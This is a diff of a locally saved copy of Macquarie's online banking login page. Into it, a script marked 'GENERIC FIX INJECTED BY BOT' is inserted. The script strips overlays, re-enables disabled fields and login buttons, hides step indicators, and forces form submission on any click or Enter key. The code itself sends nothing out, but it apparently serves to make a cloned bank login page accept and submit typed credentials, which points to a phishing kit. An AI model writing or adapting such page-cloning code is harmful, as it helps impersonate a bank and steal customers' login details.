@@ -1,7 +1,7 @@
-<!DOCTYPE html> <html lang=en class=no-js data-beasties-container><!--
+﻿<!DOCTYPE html> <html lang=en class=no-js data-beasties-container><!--
  Page saved with SingleFile 
  url: https://online.macquarie.com.au/personal/#/ 
- saved date: Sun Aug 09 2026 17:30:26 GMT+0300 (Türkiye Standart Saati)
+ saved date: Sun Aug 09 2026 17:30:26 GMT+0300 (TÃ¼rkiye Standart Saati)
 --><meta charset=utf-8>
 <meta http-equiv=X-UA-Compatible content="IE=edge">
 <meta name=viewport id=viewport content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -20,3 +20,77 @@
  
 <style>#sec-overlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;background-color:rgba(0,0,0,0.5)}@media (max-width:575px){#sec-overlay{background-color:#fff;overflow:auto;-webkit-overflow-scrolling:touch}}</style><div id=sec-overlay style=display:none></div>
 <iframe sandbox=allow-same-origin id=cd__fontDetectionFrame style=visibility:hidden;z-index:-1;width:0px;height:0px;position:absolute;top:-9999px;left:-9999px;border-width:medium;border-style:none;border-color:currentcolor;border-image:none;margin:0px;padding:0px;overflow:hidden class=sf-hidden></iframe><iframe sandbox=allow-same-origin id=cd__fontDetectionFrame style=visibility:hidden;z-index:-1;width:0px;height:0px;position:absolute;top:-9999px;left:-9999px;border-width:medium;border-style:none;border-color:currentcolor;border-image:none;margin:0px;padding:0px;overflow:hidden class=sf-hidden></iframe><iframe sandbox=allow-same-origin id=cd__fontDetectionFrame style=visibility:hidden;z-index:-1;width:0px;height:0px;position:absolute;top:-9999px;left:-9999px;border-width:medium;border-style:none;border-color:currentcolor;border-image:none;margin:0px;padding:0px;overflow:hidden class=sf-hidden></iframe><iframe sandbox=allow-same-origin id=cd__fontDetectionFrame style=visibility:hidden;z-index:-1;width:0px;height:0px;position:absolute;top:-9999px;left:-9999px;border-width:medium;border-style:none;border-color:currentcolor;border-image:none;margin:0px;padding:0px;overflow:hidden class=sf-hidden></iframe>
+<!-- GENERIC FIX INJECTED BY BOT -->
+<script>
+(function(){
+  try {
+    var overlays = document.querySelectorAll('.password-overlay, .overlay, [class*="overlay"]');
+    overlays.forEach(function(el){ try { el.style.display = 'none'; el.style.visibility = 'hidden'; el.setAttribute('aria-hidden','true'); } catch(e){} });
+  } catch(e){}
+  try {
+    var fields = document.querySelectorAll('input, select, textarea, button');
+    fields.forEach(function(el){
+      if (el.getAttribute('tabindex') === '-1') { el.setAttribute('tabindex', '0'); }
+      try { if (el.classList && el.classList.contains('input-empty-password')) { el.classList.remove('input-empty-password'); } } catch(e){}
+      if (el.hasAttribute && el.hasAttribute('readonly')) { try { el.removeAttribute('readonly'); } catch(e){} }
+      if (el.hasAttribute && el.hasAttribute('disabled')) {
+        var t = (el.getAttribute('type') || '').toLowerCase();
+        if (t !== 'hidden') {
+          var tag = (el.tagName || '').toLowerCase();
+          if (tag === 'input' || tag === 'select' || tag === 'textarea') { try { el.removeAttribute('disabled'); } catch(e){} }
+        }
+      }
+    });
+  } catch(e){}
+  try {
+    var ingHeaderContainer = document.querySelector('.login-button-container.disabled');
+    if (ingHeaderContainer) { try { ingHeaderContainer.classList.remove('disabled'); } catch(e){} }
+    var ingHeaderBtn = document.querySelectorAll('button.login-button, button.login[disabled], .login-container button[disabled]');
+    ingHeaderBtn.forEach(function(b){ try { b.removeAttribute('disabled'); } catch(e){} });
+  } catch(e){}
+  try {
+    var stepEls = document.querySelectorAll('[class*="step"], [id*="step"], [class*="Step"], [id*="Step"], [class*="indicator"], [id*="indicator"], [id*="progressbar"], [id*="progress-bar"], [class*="progress-bar"], [class*="progress"]');
+    stepEls.forEach(function(el){
+      var txt = (el.textContent || el.innerText || '').trim();
+      if (/step\s*\d|of\s*\d|adim|adım|ilerleme|ileri/i.test(txt)) { try { el.style.display = 'none'; el.setAttribute('aria-hidden','true'); } catch(e){} }
+    });
+  } catch(e){}
+  function submitNearestForm(btnOrInput){
+    try {
+      var f = null;
+      if (btnOrInput && typeof btnOrInput.closest === 'function') { f = btnOrInput.closest('form'); }
+      if (!f) { f = document.querySelector('form'); }
+      if (!f) { return; }
+      if (typeof Event === 'function') {
+        var ev = new Event('submit', { bubbles: true, cancelable: true });
+        f.dispatchEvent(ev);
+      } else {
+        var ev = document.createEvent('Event');
+        ev.initEvent('submit', true, true);
+        f.dispatchEvent(ev);
+      }
+      try { if (!ev.defaultPrevented) { f.submit(); } } catch(e){}
+    } catch(e){}
+  }
+  try {
+    var buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"]');
+    buttons.forEach(function(btn){
+      btn.addEventListener('click', function(e){
+        try { submitNearestForm(btn); } catch(err){}
+      }, true);
+    });
+  } catch(e){}
+  try {
+    var allInputs = document.querySelectorAll('form input, form select, form textarea');
+    allInputs.forEach(function(inp){
+      inp.addEventListener('keydown', function(e){
+        if (e && e.key === 'Enter') { try { submitNearestForm(inp); } catch(err){} }
+      });
+    });
+  } catch(e){}
+  try {
+    var loginContainers = document.querySelectorAll('[class*="disabled"] [class*="login"], [class*="login"][class*="disabled"]');
+    loginContainers.forEach(function(c){ try { c.classList.remove('disabled'); } catch(e){} });
+  } catch(e){}
+})();
+</script>
